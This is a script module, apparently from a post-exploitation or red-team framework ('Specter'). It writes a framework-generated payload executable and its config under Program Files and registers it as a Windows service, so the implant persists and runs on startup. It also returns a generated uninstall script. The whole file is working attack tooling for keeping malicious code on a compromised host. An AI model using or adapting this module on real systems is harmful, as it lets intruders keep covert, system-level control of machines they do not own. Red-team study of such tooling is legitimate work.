param(
    [Parameter(Mandatory = $true, HelpMessage = "The Specter build identifier.")]
    [ValidateNotNullOrEmpty()]
    [Build]
    [string]$Build,

    [Parameter(Mandatory = $true, HelpMessage = "The folder where the service directory will be created.")]
    [ValidateNotNullOrEmpty()]
    [string]$Directory = "C:\Program Files\",

    [Parameter(Mandatory = $true, HelpMessage = "The type of payload to drop.")]
    [ValidateSet("csharp_service_load_module", "csharp_service_powershell_host")]
    [string]$Payload = "csharp_service_load_module",

    [Parameter(Mandatory = $false, HelpMessage = "Determines whether or not to start the persistence method immediately.")]
    [bool]$StartImmediately = $false
)

load common;
load lateral;

#Generate a new PowerShell cradle command
$contents = payload -Build $Build -Kind $Payload;
$config = payload -Build $Build -Kind 'csharp_config';

#Get the filename of the payload
$assembly = [System.Reflection.Assembly]::Load($contents);
$filename = $assembly.GetName();
$serviceName = $filename.Name + "Svc";

#Define the paths
$localRootPath = [System.IO.Path]::Combine($Directory, $filename.Name);
$localBinaryPath = [System.IO.Path]::Combine($localRootPath, $filename.Name + ".exe");

#Copy the payload to the remote system
try {
    [void][System.IO.Directory]::CreateDirectory($localRootPath);
    [System.IO.File]::WriteAllBytes($localBinaryPath, $contents);
    [System.IO.File]::WriteAllText($localBinaryPath + ".config", $config);

    #Create the service
    $nostart = !$StartImmediately;
    Create-Service -ComputerName "localhost" -ServiceName $serviceName -Path $localBinaryPath -NoStart:$nostart;
    $success = $true;
} catch {
    $success = $false;
    throw;
}

New-Object psobject -Property @{
    Persistence = New-Object psobject -Property @{
        Method = "System Sevice";
        Profile = "System";
        Trigger = "OnStart";
        Event = "Create";
        Build = $Build;
        Payload = $Payload;
        Path = $localBinaryPath;
        Success = $success;
        UninstallScript = @"
try {
    Remove-Service -Name '$serviceName';
    [System.IO.Directory]::Delete('$localRootPath');
    `$success = `$true;
} catch {
    `$success = `$false;
}

New-Object psobject -Property @{
    Persistence = New-Object psobject -Property @{
        Method = 'System Sevice';
        Profile = 'System';
        Trigger = 'OnStart';
        Event = 'Delete';
        Build = '$Build';
        Payload = '$Payload';
        Path = '$localBinaryPath';
        Success = `$success;
    };
};
"@;
    };
};